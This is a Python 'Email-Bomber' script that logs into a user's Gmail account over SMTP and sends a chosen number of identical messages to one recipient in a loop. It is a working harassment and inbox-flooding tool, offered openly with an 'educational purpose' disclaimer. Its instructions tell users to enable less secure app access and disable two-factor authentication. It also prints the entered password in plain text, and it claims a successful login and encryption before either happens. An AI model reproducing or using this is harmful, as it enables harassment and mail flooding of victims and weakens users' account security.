print(' _________________________________ ')
print('< Email-Bomber Author : coderatul >')
print(' --------------------------------- ')
print('        \   ^__^                   ')
print('         \  (oo)\_______           ')
print('            (__)\       )\/\       ')
print('                ||----w |          ')
print('                ||     ||          ')
#we could used multiline strip but it was not preserving cowsay
print()
print('''                    source code available at : linktr.ee/programmeratul                ''')
print( '''                                     email bomber v1.0                                 ''')
print('''                                       !!!!ALERT !!!!
                    Before using this script enable less secure app acess 
                                    from senders gmail account 
                    you can go here : myaccount.google.com/lesssecureapps
                             !!! ONLY FOR EDUCATIONAL PURPOSE !!!
      ''')
print('Author : coderatul')
print('Author is not responsible for any kind of unethical act performed using this script')
print('visit smtplib documentation to know more about this project : https://docs.python.org/3/library/smtplib.html')
print('initialising program ..........')
num_count = 0
#importing simple Mail Transfer Protocol(smtp) module
import smtplib 
#getting number of mail's to be sent
try:
    nos = int(input("Enter the number of Mails to be sent :"))
except:
    print("Pls enter a valid character(only number!)")
#printing number of mails to be sent 
print("Number of mail's to be sent is",nos)
#getting sender's gmail ID from end user 
sender_email = input("Enter you gmail/sender's ID :")
#printing sender's gmail ID 
print("sender's gmail ID is : ",sender_email)
#inputing password for login into smtp server
password = input("Please enter your password : ")
#printing password entered by the end user
print("sender's gmail ID password is :",password)
#inputing receivers gamil ID 
rec_email = input("Enter receiver's gmail id :")
#printing receiver's gmail ID 
print("receiver's gmail Id is :",rec_email)
#inputing message from the end user 
message = input("Enter your message:")
#printing message to be sent 
print('message to be sent is :',message)
#using for loop for sending desired nos of mails
#using try to check whether info given is correct or not and if not the printing solution
print('login successfuly !!!')
print('encrytping traffic.....')
try:
    for i in range(nos):
         #defining email service and port (search smtp port for gmail on google)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        # starting TLS (TLS protects the transmission of the content of email messages)
        server.starttls()
        #login
        server.login(sender_email, password)
        #sending mail finally !!!
        server.sendmail(sender_email, rec_email, message)
        num_count+= 1
        print(num_count,"mail sent")
        if nos == num_count:
            print(nos,'mails have been sent to',rec_email)
            print('!!!script ended !!!')
        print('This script is powerful use wisely!!!')
except:
    print('''        {{{script Ended}}}
1. the info you entered is incorrect
solution : re - run script and enter info carefully
2. if issue not resolved switch on this :
myaccount.google.com/lesssecureapps
disable 2FA if enabled''')
             


